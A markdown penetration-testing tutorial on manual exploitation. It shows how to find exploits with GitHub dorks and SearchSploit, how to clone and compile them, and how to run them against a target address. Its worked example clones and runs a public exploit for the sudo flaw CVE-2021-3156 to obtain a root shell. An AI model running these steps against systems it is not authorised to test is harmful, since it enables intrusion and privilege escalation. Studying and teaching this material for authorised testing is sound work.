# Manual Exploitation Guide

##  Introduction
Manual exploitation is the process of **identifying, downloading, and executing exploits** without using automated tools like Metasploit. This approach is useful when **Metasploit does not have a suitable exploit** or when testing requires **manual control** over execution.

---

##  Finding an Exploit
Before manually exploiting a target, research and obtain a working exploit.

### **1️ Searching for Exploits on GitHub**
Many proof-of-concept (PoC) exploits are published on **GitHub**.
#### **Google Dork to Search GitHub**
```bash
site:github.com "<service> exploit"
```
**Example:**
```bash
site:github.com "OpenSSH 7.2 exploit"
```
- Look for repositories with PoC code.
- Check README files for **installation and usage instructions**.

#### **Using Exploit-DB & SearchSploit**
```bash
searchsploit OpenSSH 7.2
```
If a relevant exploit is found, **copy it locally**:
```bash
searchsploit -m exploits/unix/remote/4091.py
```

---

##  Cloning & Setting Up the Exploit
Once a suitable exploit is found on GitHub, clone and set it up.

### **2️ Cloning the Exploit Repository**
```bash
git clone https://github.com/username/exploit-repo.git
```
Then, **navigate into the directory**:
```bash
cd exploit-repo
```

### **3️ Install Dependencies**
Many exploits require additional dependencies. Check the **README** or `requirements.txt`.
```bash
pip install -r requirements.txt
```
If using a compiled exploit (C, C++):
```bash
gcc exploit.c -o exploit
```

---

##  Exploiting the Target
### **4️ Running the Exploit**
#### **Python Exploit Example**
```bash
python3 exploit.py --target 192.168.1.100 --port 8080
```
#### **Bash Exploit Example**
```bash
chmod +x exploit.sh
./exploit.sh 192.168.1.100
```
#### **C/C++ Exploit Example**
```bash
./exploit 192.168.1.100
```

---

##  Example: Manual Exploitation of CVE-2021-3156 (Sudo Heap Overflow)
This vulnerability allows **local privilege escalation**.

### **1️ Download the Exploit**
```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
```

### **2️ Compile the Exploit**
```bash
gcc exploit.c -o sudo_exploit
```

### **3️ Run the Exploit**
```bash
./sudo_exploit
```
- If successful, a **root shell (`#`)** will be obtained.

---

##  Troubleshooting & Tips
### **If the Exploit Fails:**
1. **Check the Target System Version**
   ```bash
   uname -a
   cat /etc/os-release
   sudo --version
   ```
2. **Try a Different Exploit Variant**
   ```bash
   searchsploit sudo
   ```
3. **Modify the Exploit Code** (Adjust hardcoded values, shellcode, offsets).
4. **Ensure Dependencies Are Installed** (Use `pip`, `apt-get`, or `dnf`).
5. **Run the Exploit with Debugging** (Use `strace`, `gdb`, or `ltrace`).

---

##  Conclusion
Manual exploitation requires **careful research, correct setup, and debugging skills**. Using **GitHub, Exploit-DB, and SearchSploit**, security testers can find and execute exploits when automated tools are unavailable.

